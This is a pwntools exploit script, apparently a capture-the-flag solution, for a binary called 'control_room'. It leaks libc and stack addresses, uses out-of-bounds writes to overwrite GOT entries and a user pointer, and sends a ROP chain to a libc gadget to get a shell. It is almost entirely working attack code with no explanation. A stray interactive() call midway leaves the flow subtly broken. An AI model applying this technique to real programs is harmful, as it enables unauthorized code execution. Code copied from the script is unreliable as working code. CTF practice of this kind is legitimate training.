import warnings
warnings.filterwarnings('ignore')

from pwn import *

p = process('./control_room')

# get captain
p.sendline(b'A' * 256)
p.sendline('256')
p.recvuntil('new username: ')
p.sendline(b'B' * 254)

# leak libc and stack
p.recvuntil(']: ')
p.sendline('3')
p.send('\x00y\n')
p.clean(timeout=1)
p.sendline('4')

p.interactive()

data = p.recvuntil('Control Panel')
data = data.decode('utf8').split('\n')
data = list(filter(lambda x: ' : ' in x, data))
libc = 0
stack = 0
for i in range(8):
    val = int(data[i].split(' : ')[1])
    if i == 1:
        libc = val - 0x43654
        print('libc:', hex(libc))
    elif i == 6:
        stack = val
        print('stack:', hex(stack))


# change to technician role
p.sendline('5')
p.sendline('1')

# overwrite plt exit with user_edit
s = str(int(((0x4050b0 - 0x405120) / 16)))
p.sendline('1')
p.sendline(s)
p.sendline(str(0x4018ED))
p.sendline('1')
p.sendline('y')

# overwrite plt strncpy with memcpy
s = str(int(((0x405020 - 0x405120) / 16)))
p.sendline('1')
p.sendline(s)
p.sendline(str(libc + 0xc48f0))
p.sendline(str(libc + 0x80ed0))
p.sendline('y')

# overwrite curr_user with stack
s = str(int(((0x405100 - 0x405120) / 16)))
p.sendline('1')
p.sendline(s)
p.sendline(str(stack))
p.sendline('1')
p.sendline('y')

# send invalid command to trigger exit
p.sendline('0')

rop = p64(stack + 0x100)  # somewhere writable
rop += p64(libc + 0x00000000001303b2)  # pop rsi; ret;
rop += p64(0x0)
rop += p64(libc + 0x000000000011f497)  # pop rdx; pop r12; ret;
rop += p64(0x0)
rop += p64(0x0)
rop += p64(libc + 0xebcf8)
rop += b'\n'

# send rop
p.sendline(str(len(rop)))
p.send(rop)

p.clean(timeout=1)
p.interactive()
